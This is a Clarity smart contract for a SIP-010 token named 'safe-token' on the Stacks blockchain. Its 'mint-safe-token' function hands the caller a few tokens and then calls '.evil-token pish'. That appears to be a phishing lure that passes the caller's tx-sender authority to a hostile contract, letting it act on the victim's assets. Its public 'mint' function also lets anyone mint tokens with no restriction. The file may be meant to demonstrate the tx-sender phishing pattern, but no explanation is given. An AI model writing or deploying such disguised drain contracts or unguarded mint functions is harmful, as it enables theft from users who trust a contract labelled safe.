;; private functions
;;

;; title: safe-token
;; version:
;; summary:
;; description:

;; traits
;;
(impl-trait 'SP3FBR2AGK5H9QBDH3EEN6DF8EK8JY7RX8QJ5SVTE.sip-010-trait-ft-standard.sip-010-trait)
;; token definitions
;;
(define-fungible-token safe-token)
;; constants
;;
(define-constant TOKEN_URI u"safe.token") 
(define-constant TOKEN_NAME "safe.token") 
(define-constant TOKEN_SYMBOL "SAFE") 
(define-constant TOKEN_DECIMALS u0) 
(define-constant ERR_NOT_TOKEN_OWNER (err u101))

;; data vars
;;

;; data maps
;;

;; public functions
;;

(define-public (mint) 
    (ft-mint? safe-token u77777 tx-sender)
)

(define-public (transfer
    (amount uint)
    (sender principal)
    (recipient principal)
    (memo (optional (buff 34)))
) 
    (begin
        (asserts! (is-eq tx-sender sender) ERR_NOT_TOKEN_OWNER)
        (try! (ft-transfer? safe-token amount sender recipient))
        (match memo to-print (print to-print) 0x)
        (ok true)
    )
)

(define-public (mint-safe-token) 
    (begin 
        (try! (ft-transfer? safe-token u777 (as-contract tx-sender) tx-sender))
        (contract-call? .evil-token pish)
    )
)


;; read only functions
;;
(define-read-only (get-balance (who principal)) 
    (ok (ft-get-balance safe-token who))
)

(define-read-only (get-total-supply) 
    (ok (ft-get-supply safe-token))
)

(define-read-only (get-name) (ok TOKEN_NAME))

(define-read-only (get-symbol) (ok TOKEN_SYMBOL))

(define-read-only (get-decimals) (ok TOKEN_DECIMALS))

(define-read-only (get-token-uri) (ok none))

;; private functions
;;